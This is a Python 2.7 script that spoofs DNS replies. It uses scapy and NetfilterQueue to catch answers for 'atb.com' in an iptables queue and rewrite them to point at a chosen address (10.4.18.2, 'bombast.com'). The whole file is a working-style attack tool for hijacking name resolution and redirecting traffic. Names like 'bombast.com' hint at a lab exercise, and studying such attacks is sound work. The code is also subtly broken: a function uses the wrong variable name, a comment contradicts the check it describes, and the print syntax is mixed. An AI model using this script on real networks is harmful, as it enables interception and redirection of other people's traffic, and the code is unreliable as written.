#! /usr/bin/env python2.7

# Sources: byt3bl33d3r, Abdou Rockikz

from scapy.all import *
from netfilterqueue import NetfilterQueue

BOMBAST_ADDR = '10.4.18.2'  # bombast.com
ISP_DOMAINS = ['atb.com']  # ISPs to change if in reply

def modify(packet):
    # Convert the raw packet to a scapy compatible string
    scapy_pkt = IP(packet.get_payload())

    # Modify packet payload
    if scapy_pkt.haslayer(DNSRR):
        # If the packet is a DNS Resource Record (DNS reply)
        # Modify the packet
        print("[Before]:", scapy_pkt.summary())
        try:
            scapy_pkt = changeToBombast(scapy_pkt)
        except IndexError:
            # Not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After]: ", scapy_pkt.summary())

        # Set the packet content to our modified version
        packet.set_payload(bytes(scapy_pkt))

    # Accept the packet
    packet.accept()

# Changes the answer portion of the given packet from other ISP addr
# to bombast addr if one is found
def changeToBombast(scapy_pkt):
    # Get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in ISP_DOMAINS:
        # Don't modify if the question is an ISP domain
        print("no modification:", qname)
        return packet

    # Craft new answer, overriding the original
    # Setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=BOMBAST_ADDR)
    # Set the answer count to 1
    packet[DNS].ancount = 1

    # Delete checksums and length of packet, because we have modified the packet
    # New calculations are required (scapy will do automatically)
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    # Return the modified packet
    return packet

nfqueue = NetfilterQueue()  

# 1 is the iptables rule queue number, modify is the callback function
nfqueue.bind(1, modify) 
try:
    print "[*] waiting for data"
    nfqueue.run()
except KeyboardInterrupt:
    pass
